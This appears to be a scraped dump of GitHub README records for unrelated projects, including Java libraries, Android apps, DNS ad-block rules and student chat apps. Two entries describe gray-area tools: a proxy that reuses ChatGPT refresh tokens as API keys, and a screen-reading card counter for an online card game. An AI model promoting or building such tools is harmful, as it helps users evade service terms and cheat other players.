#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) 中转oaifree或者PandoraToV1Api的/v1/chat/completions和v1/images/generations接口，把refresh_token当key使用，内含hashmap,自动更新access_token,完美继承pandoraNext留下的refresh_token,支持基本所有的模型，小白也能快速使用！

#### [refresh-gpt-chat](https://github.com/Yanyutin753/refresh-gpt-chat) Intercept the /v1/chat/completions and v1/images/generations interface of oaifree or PandoraToV1Api, use the refresh_token as the key, which contains a hashmap, automatically update the access_token, perfectly inherit the refresh_token left by pandoraNext, support almost all models, even beginners can use it quickly!

-----

> ## 功能特性
>
> * **通过refresh_token自动更新access_token**：方便使用
>
> * **通过refresh_token作为key进行使用**：更好放入one-api里面
>
> * **支持反代v1/images/generations接口**：调用dall-e-3画图更出色
>
> * **支持反代v1/audio/speech接口**：调用tts-1，文字转语音
>
> * **支持反代v1/audio/transcriptions接口**：调用whisper-1，语言转文字
>
> * **可适用于oaifree、PandoraToV1Api项目**：反代服务，直接使用
>
> * **自定义后缀**：防止url被滥用
>
> * **支持base64识图**：能转发识图接口
>
> * **回复打字机处理**：回复更流畅，减少卡顿
>
> * **个人部署**：保障隐私安全
>

## [✨点击查看文档站](https://apifox.com/apidoc/shared-4b9a7517-3f80-47a1-84fc-fcf78827a04a)

> [!important]
>
> * 本项目只提供转发接口🥰
> * 开源项目不易，请点个星星吧！！！

## Sponsor

### 如果你觉得我的开源项目对你有帮助，可以赞助我一杯咖啡嘛，十分感谢！！！

<img src=""https://github.com/Yanyutin753/RefreshToV1Api/assets/132346501/e5ab5e80-1cf2-4822-ae36-f9d0b11ed1b1"" width=""300"" height=""300"">

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Yanyutin753/refresh-gpt-chat&type=Date)](https://star-history.com/#Yanyutin753/refresh-gpt-chat&Date)
",10,1,1,MIT
KarinJS/QwQ,master,"<div align=""center"">

![][banner]

[![][actions]][actions-link]
[![][releases]][releases-link]
[![][downloads]][releases-link]

[![][license]](LICENSE)

</div>

## 简介

QwQ 是基于 LSPosed 实现的类似于QAuxiliary的通用性QQ增强LSPosed模块。

> 本项目仅提供学习与交流用途，请在24小时内删除。   
> 本项目目的是研究 LSPosed 框架的使用。 Epic 框架开发相关知识。  
> 如有违反法律，请联系删除。
> 请勿在任何平台宣传，宣扬，转发本项目，请勿恶意修改企业安装包造成相关企业产生损失，如有违背，必将追责到底。
> 
> 本项目在多处拥有唯一的特征，如若今后在任何闭源模块发现，将会给予警告及公示！
> 本项目代码仅提供学习与交流，不提供私有化，闭源分发！
> 
> [Discord社区](https://discord.gg/MKR2wz863h)

## 兼容说明

- 安卓版本 >= 8.1
- QQ版本 >= 8.x

## 使用方法

> 访问 ``qwq.dev`` 或者 ``qwq.qq.com`` 即可进入设置界面
> 设置界面采用的是 **element-plus** + **vue** 实现
> 您可以通过编辑``/storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/QwQ/domain``中的域名，将设置界面定义到您的自定义美化设置界面站点，通过QwQ开放的Js桥接口，实现您需要的功能。
> [qwq-web-setting](https://github.com/KarinJS/qwq-web-setting)

## 提供的功能

- 基于协议实现的反撤回（通用Hook，无需每个版本都更新一次模块）
- 提供消息加密功能（非对应密钥的消息不解密只显示一个表情包）

## 权限声明

> 如出现未在此处声明的权限，请警惕 QwQ 是否被修改/植入恶意代码

## 开源协议

本项目使用 [GPL-3.0](LICENSE) 协议开放源代码

```text
QwQ - LSPosed Module for QQ
Copyright (C) 2023 QwQ Team
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
```

## 感谢以下项目

- [QAuxiliary](https://github.com/cinit/QAuxiliary): Plagiarism of the project code
- [LSPosed](https://github.com/LSPosed/LSPosed): Hook framework
- [vue](https://cn.vuejs.org/): Setting page framework
- [OpenShamrock](https://github.com/whitechi73/OpenShamrock): Protocol Hook

## 贡献者

[![][contrib-image]][contrib-link]

[banner]: https://socialify.git.ci/whitechi73/QwQ/image?description=1&forks=1&issues=1&logo=https://github.com/whitechi73/QwQ/assets/98259561/bf4ebdb6-da8d-4204-80aa-5db91e0c97ab&pattern=Plus&pulls=1&stargazers=1&theme=Auto

[actions]: https://img.shields.io/github/actions/workflow/status/whitechi73/QwQ/build-apk.yml?style=for-the-badge

[actions-link]: https://github.com/whitechi73/QwQ/actions/workflows/build-apk.yml

[releases]: https://img.shields.io/github/v/release/whitechi73/QwQ?style=for-the-badge

[releases-link]: https://github.com/whitechi73/QwQ/releases

[downloads]: https://img.shields.io/github/downloads/whitechi73/QwQ/total?style=for-the-badge

[license]: https://img.shields.io/github/license/whitechi73/QwQ?style=for-the-badge

[contrib-image]: https://contrib.rocks/image?repo=whitechi73/QwQ

[contrib-link]: https://github.com/whitechi73/QwQ/graphs/contributors",0,0,1,GPL-3.0
DHD2280/BCR-Manager,master,"# Basic Call Recorder Manager (BCR Manager)

A simple manager for BCR.

[![Android](https://img.shields.io/badge/Platform-Android-green.svg?style=flat-square)](https://www.android.com) [![API](https://img.shields.io/badge/API-28%2B-orange.svg?logo=android&style=flat-square)](https://developer.android.com/studio/releases/platforms) [![Release](https://img.shields.io/github/v/release/DHD2280/BCR-Manager)](https://github.com/DHD2280/BCR-Manager/releases)

<img src=""app/images/icon.png"" alt=""app icon"" width=""144"" />
<img src=""app/images/Screenshots.png"" alt=""app icon"" width=""2350"" />



Since I really love Basic Call Recorder, I made a simple app to manage registrations saved with BCR.


## Table of Contents

- [Introduction](#introduction)
- [Requirements](#requirements)
- [Features](#features)
- [Permissions](#permissions)
- [How it works](#how-it-works)
- [Feedback](#feedback)
- [Issues](#issues)
- [License](#license)
- [Changelog](#changelog)
- [TODOs](#todos)
- [Acknowledgments](#acknowledgments)
- [Screenshots](#screenshots)
- [Donations](#donations)


## Introduction

This is a simple app, that I have developed for myself. The purpose of this app is to manage all records and simply search and listen.
You can add some breakpoints to every registration, and mark any registration as starred, so when open the app, you will find starred on top.
The app has Dynamic Shortcuts too, based on the count of registrations per-contact.
I'm not a professional developer, so the code is not perfect. I've tested the app on A13 and A14.

## Requirements

If you want to use BCR Manager, you need BCR 1.49 (or newer), because the app needs the JSON Metatada from BCR.
So you you have BCR, ensure to enable ""Write JSON Metadata"".

## Features

A few of the things you can do with BCR Manager:

* Listen your recordings
* Filter your recordings
* Share and delete recordings
* Batch delete recordings (e.g. per-contact and/or per-date and/or per-duration)
* Mark a recording as starred
* Create breakpoints for every recording

## Permissions

This app requires the following permissions, but it's not mandatory:

`android.permission.READ_CALL_LOG`
Permission to read Call Log, for getting the contact name (and business name if contact not saved) based on Call Log


`android.permission.READ_CONTACTS`
Permission for Read Contacts: needed to get the contact name, all contact's numbers and contact pictures.
Contacts numbers are used for dynamic shortcuts.

`android.permission.READ_PHONE_STATE`
Permission to Read Phone State: to get VoiceMail's number, Emergency number (for creating the LetterTileDrawable) and numbers of active SIMs.

## How it works
The application asks the Directory where all registrations are saved, then checks all files.
For registrations that has a JSON file, it will parse the JSON file based on Gson Library and get all metadata.
For registrations that hasn't a JSON file, it will parse the filename. Ensure that you have at least date and number in the filename.
It will check in the Call Log for the number and get the contact name (and business name if contact not saved).
If the contact is saved, it will get the contact picture too from Contacts.
When all file are parsed, the app saves all registrations in a JSON file, so on the next open it will load the JSON file instead of parsing all files again.
The app checks for directory changes, so it will know where to parse new files or when a file is deleted.

## Feedback

Feature requests are always welcome. If you want to make a feature request, open a new issue.

## Issues

If you want to report an issue with the app, just open a new issue on GitHub.

## License

BCR Manager is licensed under GPLv3. Please see [`LICENSE`](./LICENSE.md) for the full license text.

## Changelog

See [`CHANGELOG`](./CHANGELOG.md) for a complete list of changes.

## TODOs
TODOs, but I don't know if I will do it, but if the app will be popular, I will do it.
- Improve code quality
- ~Add custom Themes (colors)~
- Migrate to Kotlin (not necessary)
- ~Migrate to ViewModel~
- Add desktop shortcut per-contact

## Acknowledgments

Thanks to [chenxiaolong](https://github.com/chenxiaolong) for making such a big app [Basic Call Recorder](https://github.com/chenxiaolong/BCR).

## Screenshots
<img src=""app/images/dark/home_dark.jpg"" alt=""app icon"" width=""300"" />  <img src=""app/images/light/home_light.jpg"" alt=""app icon"" width=""300"" />

## Donations

If you want to support me, you can donate me via PayPal.

[![Donate](./app/images/PayPal.svg)](https://www.paypal.me/luigifale)",9,6,1,GPL-3.0
yangdayangda/cardRecorder,master,"## 基于安卓opencv实现的欢乐斗地主记牌器

### 使用效果图
停止后面显示的信息分别为玩家一的出牌区域识别的点数，玩家二的点数，以及一个时间（每次识别屏幕一次都会更新一次，单位为s）

![](img/fc92f3ece413e2fa4d486f8487bde90.jpg)

### 安装与使用

安装好应用程序以后，点击打开，此时会申请开启悬浮窗权限，以及录屏权限，同意即可。

![](img/98bdca77ddc635d2b3366d6002741c0.jpg)

到达游戏界面，等待发牌以后点击开始，此时程序会初始化，记牌器的数量就是全部牌数量减去自己手牌的数量，只有在初始化时才会减去手牌的数量，所以需要在每次游戏开始时，都需要点击开始按钮。可以看到，记牌器的数量就是减去手牌数量以后的牌数。

程序的运行逻辑大致如下：

1.开始时识别手牌区域，记牌器显示手牌外还剩余多少牌。

2.每间隔1.5s（该时间可以设置）获取一次屏幕截图，识别玩家一和玩家二的出牌区域点数，如果当前时间和上次时间的点数相同，就不更新记牌器，如果不同，说明该玩家出了新的牌，那么更新记牌器。程序识别牌点数需要耗费一定时间，所以记牌器显示的时间间隔一定是大于1.5s的。

![](img/a5e03d0e3b8c8e28b9b52e601ff0c1e.jpg)

此程序使用的是opecv的模板匹配进行识别牌名的，所以涉及到像素操作，在某些尺寸的手机上面运行可能会出错（虽然程序做了不同屏幕的适配），可以自行修改项目里面的出牌区域或者每一个点数的截图。在手机屏幕为3200x1440和2400x1080上面运行是没有问题的。

![](img/img.png)
",1,0,1,
xdev-software/spring-data-eclipse-store,develop,"[![Latest version](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?logo=apache%20maven)](https://mvnrepository.com/artifact/software.xdev/spring-data-eclipse-store)
[![Build](https://img.shields.io/github/actions/workflow/status/xdev-software/spring-data-eclipse-store/check-build.yml?branch=develop)](https://github.com/xdev-software/spring-data-eclipse-store/actions/workflows/check-build.yml?query=branch%3Adevelop)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=xdev-software_spring-data-eclipse-store&metric=alert_status)](https://sonarcloud.io/dashboard?id=xdev-software_spring-data-eclipse-store)
[![Documentation](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?label=docs)](https://spring-eclipsestore.xdev.software/)

<div align=""center"">
    <img src=""assets/Logo.png"" height=""200"" alt=""XDEV Spring-Data Eclipse-Store Logo"">
</div>

# spring-data-eclipse-store

A library to simplify using [EclipseStore](https://eclipsestore.io/) in the [Spring environment](https://spring.io/projects/spring-data/).

What makes this library special is, that it creates a working copy of the data.
This way EclipseStore behaves almost exactly like relational database from a coding perspective.

## Features

The library provides following features:

* Enforces the
  **[Spring data repository concept](https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html)**
  for EclipseStore by
  using [working copies](https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html)
* **[Drop in compatible](https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible)** for your existing Spring application
* Utilizes **ultra-fast EclipseStore serializing and storing**
* Enables your application to **select
  any [EclipseStore target](https://docs.eclipsestore.io/manual/storage/storage-targets/index.html)** (e.g.
  [PostgreSQL](https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html),
  [AWS S3](https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html) or
  [IBM COS](https://github.com/xdev-software/eclipse-store-afs-ibm-cos))
* Can save up to **99%[^1] of monthly costs** in the IBM Cloud and up to 82%[^2] in the AWS Cloud

[^1]:If the COS Connector is used in the IBM Cloud instead of a PostgreSQL and approx. 10,000 entries with a total size
of 1
GB of data are stored. ([IBM Cloud Pricing](https://cloud.ibm.com/estimator/estimates), as of 08.01.2024)

[^2]: If the S3 connector is used instead of DynamoDB under the same conditions at
AWS. ([AWS Pricing Calculator](https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8), as of
08.01.2024)

## Installation & Usage

[**Installation
guide** for the latest release](https://github.com/xdev-software/spring-data-eclipse-store/releases/latest#Installation)

[**Detailed
instructions** are in the documentation](https://xdev-software.github.io/spring-data-eclipse-store/installation.html)

### Supported versions

| Spring-Data-Eclipse-Store | Java   | Spring Data | EclipseStore |
|---------------------------|--------|-------------|--------------|
| ``<= 1.0.2``              | ``17`` | ``3.2.2``   | ``1.1.0``    |
| ``1.0.3/1.0.4``           | ``17`` | ``3.2.3``   | ``1.2.0``    |
| ``1.0.5-1.0.7``           | ``17`` | ``3.2.5``   | ``1.3.2``    |
| ``1.0.8-1.0.10``          | ``17`` | ``3.3.1``   | ``1.3.2``    |
| ``2.0.0-2.1.0``           | ``17`` | ``3.3.2``   | ``1.4.0``    |
| ``>= 2.2.0``              | ``17`` | ``3.3.4``   | ``1.4.0``    |

## Demo

To see how easy it is to implement EclipseStore in your Spring project, take a look at
the [demos](./spring-data-eclipse-store-demo):

* [Simple demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/simple)
* [Complex demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/complex)
* [Demo with coexisting JPA](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-jpa/src/main/java/software/xdev/spring/data/eclipse/store/jpa)
* [Dual storage demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/dual/storage)

> [!NOTE]  
> Since the library is using reflection to copy data, the following JVM-Arguments may have to be set:
> ```
> --add-opens=java.base/java.util=ALL-UNNAMED
> --add-exports java.base/jdk.internal.misc=ALL-UNNAMED
> --add-opens=java.base/java.lang=ALL-UNNAMED
> --add-opens=java.base/java.time=ALL-UNNAMED 
> ```

## Support

If you need support as soon as possible, and you can't wait for any pull request, feel free to
use [our support](https://xdev.software/en/services/support).

## Contributing
See the [contributing guide](./CONTRIBUTING.md) for detailed instructions on how to get started with our project.

## Dependencies and Licenses

View the [license of the current project](LICENSE).
",18,2,11,Apache-2.0
lgdd/liferay-client-extensions-samples,main,"![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/lgdd/liferay-client-extensions-samples/builder.yml?label=auto-update&style=flat)
![GitHub last commit](https://img.shields.io/github/last-commit/lgdd/liferay-client-extensions-samples?color=informational&label=latest%20update)

# Liferay Client Extensions Samples

Automatically mirror official client extensions samples you can find in the main repo here: https://github.com/liferay/liferay-portal/tree/master/workspaces/liferay-sample-workspace/client-extensions

The goal of this repository is to ease the process of trying out client extensions samples by removing the burden of cloning liferay-portal & by renaming ambiguous client extensions (e.g. `custom-element-1`).

The official readme file for those samples is mirrored in the [HOW-TO.md](HOW-TO.md).

The new naming is an arbitrary choice based on the description provided by Liferay in the readme file. Here's the correspondance for the renamed client extensions:

| **Original name** | **New name**                                                 |
|-------------------|--------------------------------------------------------------|
| liferay-sample-custom-element-1  | liferay-sample-custom-element-vanilla-js      |
| liferay-sample-custom-element-2  | liferay-sample-custom-element-react-scripts   |
| liferay-sample-custom-element-3  | liferay-sample-custom-element-angular         |
| liferay-sample-custom-element-4  | liferay-sample-custom-element-react-dom       |
| liferay-sample-custom-element-5  | liferay-sample-custom-element-react-clayui    |
| liferay-sample-etc-frontend      | liferay-sample-etc-frontend-shared-import-map |
| liferay-sample-global-js-1       | liferay-sample-global-js-page			           |
| liferay-sample-global-js-2       | liferay-sample-global-js-page-with-attributes |
| liferay-sample-global-js-2       | liferay-sample-global-js-instance      			 |
| liferay-sample-iframe-1          | liferay-sample-iframe-counter                 |
| liferay-sample-iframe-2          | liferay-sample-iframe-wikipedia               |
| liferay-sample-theme-css-1       | liferay-sample-theme-css-styled               |
| liferay-sample-theme-css-2       | liferay-sample-theme-css-unstyled             |
| liferay-sample-theme-css-3       | liferay-sample-theme-css-token-definition     |
| liferay-sample-theme-spritemap-1 | liferay-sample-theme-spritemap-single-svg     |
| liferay-sample-theme-spritemap-2 | liferay-sample-theme-spritemap-multiple-svg   |

## Aditional information

If the build fails because of the Node version, you can force the use of a specific version by changing the build.gradle with something like:

```gradle
apply plugin: ""com.liferay.node""

node {
	nodeVersion = ""20.10.0""
	global = false
}
```
> Note that you can apply this for a specific client extension or all client extensions if you change the value in the parent folder (`client-extensions` or your liferay workpace).",0,0,1,MIT
Berkeley-CS61B/skeleton-sp24,main,,0,0,16,
guandasheng/adguardhome,main,"<div align=""center"">
<h1 align=""center"">TheBestAdrules<br></h1>
  <p>TheBestAdrules，适用于Adguard Home的去广告dns规则，由关圣云®整理上游优秀的规则，合并去重而来，集百家之所长，取其精华去其糟粕。
关圣云®官网https://dns.dns1.top 官方微信群及QQ群见官网公布。
关圣云®DNS，一个人人可加入的公益去广告dns团队，目前拥有7条公益dns节点。
捐赠，或者提供服务器均可加入“关圣云®爱发电”团队。 
由于目前网络上发布的规则众多，逐个添加难免有重复的，而且不方便维护，因此创建此仓库，方便关圣云更新dns规则，也可以方便其他自建dns的小伙伴一键导入。
  </p>
</h1>
<p>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/last-commit/guandasheng/TheBestAdrules?style=flat-square"" alt=""last update"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/forks/guandasheng/TheBestAdrules?style=flat-square"" alt=""forks"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/stars/guandasheng/TheBestAdrules?style=flat-square"" alt=""stars"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules/issues/"">
    <img src=""https://img.shields.io/github/issues/guandasheng/TheBestAdrules?style=flat-square"" alt=""open issues"" />
  </a>
  <a href=""https://github.com/guandasheng/TheBestAdrules"">
    <img src=""https://img.shields.io/github/license/guandasheng/TheBestAdrules?style=flat-square"" alt=""license"" />
  </a>
</p>

<h4>
    <a href=""#a"">规则订阅</a>
  <span> · </span>
    <a href=""#b"">上游列表</a>
  <span> · </span>
    <a href=""#c"">拦截效果</a>
  <span> · </span>
    <a href=""#d"">完善项目</a>
  </h4>

</div>

<h2 id=""a"">🎯 规则订阅</h2>

```
更新时间: 2024-01-05 16:47:17 （北京时间） 

拦截规则数量: 786040 
白名单规则数量: 7263 
``` 
<details open>
<summary>规则列表</summary>
<ul>
  
- **[黑名单规则（Github）](https://raw.githubusercontent.com/guandasheng/TheBestAdrules/main/rule/all.txt)**
- **[黑名单规则(CF国内加速-推荐)](https://github.guanmengkai.bf/https://raw.githubusercontent.com/guandasheng/TheBestAdrules/main/rule/all.txt)**
- **[黑名单规则(Gitee国内加速-延迟12H)](https://gitee.com/guanmengkai/TheBestAdrules/raw/main/rule/all.txt)**

</ul>
</details>



<h2 id=""c"">🚫 拦截效果</h2>

[AdBlock Tester](https://adblock-tester.com)

[Block Ads! Adblock test](https://blockads.fivefilters.org/)

[Ad Blocker Test](https://d3ward.github.io/toolz/adblock.html)

<h2 id=""d"">💬 完善项目</h2>

大家可以提交 Issue (不及时)
或者加入微信QQ群（及时）
QQ群号786113957
微信群加gmk2099备注dns
来帮助我完善规则 我审核之后会加入到规则，如果规则有误杀我会尽快处理



**提交范围**

- 漏拦截的广告
- 误杀的网站


",0,1,1,MIT
javpower/easy-flv,main,"<!-- Easy-FLV: Java RTSP/RTMP to FLV Converter -->
# 📺 Easy-FLV: Java RTSP/RTMP to FLV Converter

[![GitHub stars](https://img.shields.io/github/stars/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv) 
[![GitHub issues](https://img.shields.io/github/issues/javpower/easy-flv.svg)](https://github.com/javpower/easy-flv/issues) 
[![Apache License 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) 
[![Java Version](https://img.shields.io/badge/java-1.8+-orange.svg)](https://adoptopenjdk.net/) 
[![Spring Boot](https://img.shields.io/badge/spring--boot-2.7.+-blue.svg)](https://spring.io/projects/spring-boot) 

## 🌟 About Easy-FLV
Easy-FLV is a Java library that converts RTSP or RTMP video streams into FLV format for playback in web browsers. It provides an efficient, stable, and easily integrable solution for real-time video monitoring, live streaming, and video stream processing.

### Why Choose Easy-FLV?
- **Efficient Conversion**: Quickly converts video streams to FLV format with no complex configuration required.
- **Easy Integration**: Used as a Spring Boot Starter, it can be easily integrated into any Java project.
- **Modern Browser Support**: Supports all major modern browsers without the need for additional plugins.
- **Real-time Stream Processing**: Suitable for the conversion of real-time video streams, such as security monitoring and live broadcasting.

## 📄 Screenshots
Below are screenshots of Easy-FLV in action:

![img_1.png](img_1.png)
![img.png](img.png)

## 🚀 Quick Start

### Add Maven Dependency
Include the following Maven dependency in your Spring Boot project:

```xml
<dependency>
    <groupId>io.github.javpower</groupId>
    <artifactId>rtsp-converter-flv-spring-boot-starter</artifactId>
    <version>1.5.9.1</version>
</dependency>
```

### Implement Interface
Create a service class that implements the `IOpenFLVService` interface to provide the stream address:

```java
@Service
public class RtspDataService implements IOpenFLVService {

    @Override
    public String getUrl(Integer channel) {
        // Retrieve the RTSP stream address based on the channel
        return ""rtsp://10.11.9.251:554/openUrl/16HV8mA"";
    }
}
```

### Configure YAML
Configure Easy-FLV in your `application.yml`:

```yaml
easy:
  flv:
    host: http://localhost:8200
```

### Use Interface
To get the converted stream address and play it in a browser:

- Conversion URL: `GET http://ip:port/get/flv/hls/stream_{channel}.flv`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream_{channel}.flv`

### Direct Usage
If you prefer not to implement an interface, you can directly encode the stream address and convert it:

```java
public static void main(String[] args) throws UnsupportedEncodingException {
    String url = ""rtsp://XXXXXXXX"";
    String encodedUrl = java.net.URLEncoder.encode(url, ""UTF-8"");
    System.out.println(""Encoded Stream URL: "" + encodedUrl);
}
```

- Conversion URL: `GET http://ip:port/get/flv/hls/stream?url=EncodedAddress`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream?url=EncodedAddress`

## 🛠️ Contribution
Contributions of any kind are welcome, including but not limited to reporting bugs, submitting fixes, adding new features, and improving documentation.

## 📄 License
Easy-FLV is released under the [Apache License 2.0](LICENSE).

## 📧 Contact
- Email: [javpower@163.com](mailto:javpower@163.com)
- GitHub: [https://github.com/javpower/easy-flv](https://github.com/javpower/easy-flv)
- Gitee: [https://gitee.com/giteeClass/easy-flv](https://gitee.com/giteeClass/easy-flv)
",0,3,1,Apache-2.0
SUDHARSUN2003/Accident-Detection-And-Notification,main,"# Accident-Detection-And-Notification


STEPS FOR RUNNING ANDROID PROJECT

STEP 1: OPEN ANDROID STUDIO
STEP 2: CLICK ON OPEN AN EXISTING ANDROID STUDIO PROJECT
STEP 3: BROWSE TO THE PROJECT LOACTION
STEP 4: GO TO RUN TAB 
STEP 5: CLICK ON 'Run App'
STEP 6: THE .apk FILE WILL BE GENERATED IN BIN FOLDER
STEP 7: TRANSFER AND INSTALL THE FILE IN THE MOBILE  
STEP 8: USE THE FUNCTIONALITY OF THE APPLICATION
",0,0,1,
Nexters/Don-t-Forget---Server,dev,"# 챙겨챙겨 Don't Forget
음력 기반 디데이 서비스 - 챙겨 챙겨의 서버 레포입니다 🙂
부모님 음력 생신 까먹는 연간 불효자, 이 시간부로 그만하겠습니다. </br>
트렌디한 효자가 되고 싶은 사람 당장 모여.

![image](https://github.com/Nexters/Don-t-Forget---iOS/assets/57654681/f4af249b-9942-4e05-82ce-76cca1e2711d)

<div align=""center"">
  <a href=""https://apps.apple.com/us/app/id6477602223"">
  <img src=""https://github.com/Nexters/Don-t-Forget---iOS/assets/57654681/a3f3f7f8-237a-451d-ab47-d8ceb901d44e"" height=""100""></a><a href=""https://play.google.com/store/apps/details?id=nexters.hyomk.dontforget""><img src=""https://github.com/Nexters/Don-t-Forget---iOS/assets/57654681/f1f0cf43-e76d-4a56-85db-405cd44d3ef2"" height=""100""></a>
  </div>

## Server
| 박종하 | 허수진 |
|:--:|:--:|
| [@worldii](https://github.com/worldii) | [@her0807](https://github.com/her0807) |
| <img src=""https://avatars.githubusercontent.com/u/87687210?v=4"" width=""120""> | <img src=""https://avatars.githubusercontent.com/u/26570275?v=4"" width=""120""> |

## 주마둥이들
[🛸 안드로이드](https://github.com/Nexters/Don-t-Forget---Android)</br>
[💽 IOS ](https://github.com/Nexters/Don-t-Forget---iOS)</br>
🎨 디자이너(물어보고 올림)
",0,6,29,
Just-Clover/YOUng-chat-backend,develop,"# YOUng-chat

사용할수록 젊어지는, 실시간 채팅 서비스

## 목차

1. [프로젝트 소개](#1.-프로젝트-소개)
2. [팀원 소개](#2-팀원-소개)
3. [아키텍처](#3-아키텍처)
4. [ERD](#4-erd)
5. [주요 기술](#5-주요-기술)
6. [기술적 의사결정](#6-기술적-의사결정)
7. [트러블 슈팅](#7-트러블-슈팅)

## 1. 프로젝트 소개

* **프로젝트 기간** : 2024.1.4 ~ 2024.2.8
* **시연 영상** : [🍀YOUngChat 시연 영상 바로가기](https://www.youtube.com/watch?v=WZ4JzStrWnI)
* **배포 사이트** : [🍀YOUngChat 배포 사이트 바로가기](https://youngchat.store)
* **Front Repository** : [FE GitHub Repository](https://github.com/Just-Clover/YOUng-chat-frontend)

단순한 기능과 한 눈에 들어오는 UI로 남녀노소 누구나 쉽게 사용할 수 있는 **실시간 채팅 서비스** 입니다.
서비스 로직보다는 **기술적인 도전**을 더 중점적으로 진행하였습니다.

## 2. 팀원 소개

| ![profile](https://avatars.githubusercontent.com/u/73452223?v=4) | ![profile](https://avatars.githubusercontent.com/u/75934088?v=4) | ![profile](https://avatars.githubusercontent.com/u/109781694?v=4) |
|:----------------------------------------------------------------:|:----------------------------------------------------------------:|:-----------------------------------------------------------------:|
|                                리더                                |                               부리더                                |                                팀원                                 |
|        정해인</br> [@seaStamp](https://github.com/seaStamp)         |         최준영 </br> [@junxtar](https://github.com/junxtar)         |       용소희</br>[@yongcowhee](https://github.com/yongcowhee)        |

## 3. 아키텍처

![스크린샷 2024-02-04 오후 10 53 51](https://github.com/Just-Clover/YOUng-chat-backend/assets/73452223/887acc02-6be4-4f26-a29e-4389336d6597)

## 4. ERD

![image](https://github.com/Just-Clover/YOUng-chat-backend/assets/73452223/27818c10-e5c2-49cf-9411-b5bc7f0632c5)

## 4. 사용 기술

<details>
<summary><b>BE</b></summary>

- Java 17
- Spring boot 3.1.7
- Spring Security 3.2.2
- JWT 0.11.5
- Spring Data JPA 3.1.7
- Spring Data Redis 3.1.7
- QueryDSL 5.0.0
- WebSocket 3.2.2
- RabbitMQ 3.12.12
- STOMP 3.2.2

</details>

<details>
<summary><b>FE</b></summary>

- React
- Vite
- Mui
- Zustand
- Axios
- rabbitmq-client
- stompjs

</details>

<details>
<summary><b>DB</b></summary>

- MySQL 8.0.35
- Redis 7.2
- H2 2.2.220

</details>

<details>
<summary><b>Infra</b></summary>

- EC2
- ECR
- S3
- LoadBalancer(ALB)
- CodeDeploy
- RDS(MySQL)
- Route53
- ElastiCache(Redis)
- CloudFront
- Docker

</details>

## 5. 주요 기술

### RabbitMQ & STOMP

> **실시간 채팅**

- 1:1 채팅 구현
- 단체 채팅 구현

> **채팅 알림**

- Message Broker인 RabbitMQ를 이용한 채팅 알림 서비스 구현

### JMeter

> **부하테스트**

- JMeter를 이용한 부하테스트 진행 → Query성능 개선 및 아키텍처 수정을 통한 성능 개선

### Spring Security & JWT & Redis

> **이메일 인증 및 회원 가입**

- 회원 가입 시 이메일 인증 진행
- Redis에 Authentication Code, User 정보 저장
- 인증 진행 후 삭제하여 재접근 제한

> **인증/인가**

- JWT를 이용한 AccessToken과 RefreshToken 발급 및 로그인 처리
- Token 방식의 회수 불가능한 단점 보완을 위한 Redis TTL 방식 로그아웃 처리

## 6. 기술적 의사결정

[🔗 Cursor-based Pagination 도입](https://github.com/Just-Clover/YOUng-chat-backend/wiki/Cusor%E2%80%90based-Paginantion-%EB%8F%84%EC%9E%85)

[🔗 부하/성능 테스트 툴 - Jmeter](https://github.com/Just-Clover/YOUng-chat-backend/wiki/%EB%B6%80%ED%95%98-%EC%84%B1%EB%8A%A5-%ED%85%8C%EC%8A%A4%ED%8A%B8-%ED%88%B4-Jmeter)

[🔗 Websocket 적용 및 RabbitMQ](https://github.com/Just-Clover/YOUng-chat-backend/wiki/Websocket-%EC%A0%81%EC%9A%A9-%EB%B0%8F-RabbitMQ#1-websocket-%EB%8F%84%EC%9E%85)

[🔗 CI / CD](https://github.com/Just-Clover/YOUng-chat-backend/wiki/CI-CD)

[🔗 로깅 전략](https://github.com/Just-Clover/YOUng-chat-backend/wiki/%EB%A1%9C%EA%B9%85-%EC%A0%84%EB%9E%B5)

## 7. 트러블 슈팅

[🔗 AWS 배포서버 중단 이슈](https://github.com/Just-Clover/YOUng-chat-backend/wiki/AWS-%EB%B0%B0%ED%8F%AC-%EC%84%9C%EB%B2%84-%EC%A4%91%EB%8B%A8-%EC%9D%B4%EC%8A%88)

